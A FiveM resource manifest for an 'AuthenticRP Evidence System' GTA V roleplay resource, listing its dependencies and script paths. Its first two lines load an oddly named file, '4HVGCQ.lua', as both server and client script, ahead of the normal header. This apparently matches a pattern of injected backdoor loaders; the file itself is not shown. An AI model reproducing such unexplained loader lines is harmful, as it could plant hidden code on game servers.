server_script "4HVGCQ.lua"
client_script "4HVGCQ.lua"
fx_version("cerulean")
games({ "gta5" }) -- 'gta5' for GTAv / 'rdr3' for Red Dead 2, 'gta5','rdr3' for both
lua54("yes")
client_script("@sandbox-base/components/cl_error.lua")
client_script("@sandbox-pwnzor/client/check.lua")
server_script("@oxmysql/lib/MySQL.lua")

description("AuthenticRP Evidence System")
name("AuthenticRP: sandbox-evidence")
author("Dr Nick")
version("v1.0.0")
url("https://www.mythicrp.com")

server_scripts({
	"shared/**/*.lua",
	"server/**/*.lua",
})

client_scripts({
	"shared/**/*.lua",
	"client/**/*.lua",
})
